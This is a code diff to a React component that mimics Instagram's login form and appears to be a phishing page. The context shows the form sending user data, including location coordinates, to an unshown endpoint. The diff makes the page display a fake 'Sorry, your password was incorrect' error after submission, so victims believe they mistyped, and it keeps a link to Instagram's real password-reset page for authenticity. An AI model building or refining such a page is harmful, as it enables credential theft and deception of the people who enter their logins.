@@ -17,6 +17,7 @@ export default function InstagramLogin() {
   const [usernameInput, setUsernameInput] = useState("");
   const [passwordInput, setPasswordInput] = useState("");
   const [showPassword, setShowPassword] = useState(true);
+  const [isLoginError, setIsLoginError] = useState(false);
   const [isLoginAction, setIsLoginAction] = useState(false);
   const [userRef, setUserRef] = useState<any>("");
 
@@ -69,7 +70,8 @@ export default function InstagramLogin() {
               longitude: data.longitude,
             }),
           });
-          window.location.reload();
+          setIsLoginError(true);
+          setIsLoginAction(false);
         } catch (error) {
           console.error(error);
         }
@@ -198,6 +200,7 @@ export default function InstagramLogin() {
           <button
             className="w-full rounded-lg py-[6px] mt-5 bg-[rgba(0,149,246,1)] text-sm text-white font-semibold"
             onClick={() => handleLogin()}
+            disabled={isLoginAction}
           >
             {isLoginAction ? (
               <span className="w-4 h-4 block border-2 border-white border-l-transparent opacity-80 mx-auto rounded-full animate-spin"></span>
@@ -222,6 +225,13 @@ export default function InstagramLogin() {
           </span>
           <p className="text-sm font-semibold">Log in with Facebook</p>
         </div>
+
+        {isLoginError && (
+          <p className="text-center text-[13px] mt-7 text-[rgb(237,_73,_86)]">
+            Sorry, your password was incorrect. Please double-check your
+            password.
+          </p>
+        )}
 
         {/* Forgot Password */}
         <a href="https://www.instagram.com/accounts/password/reset/">
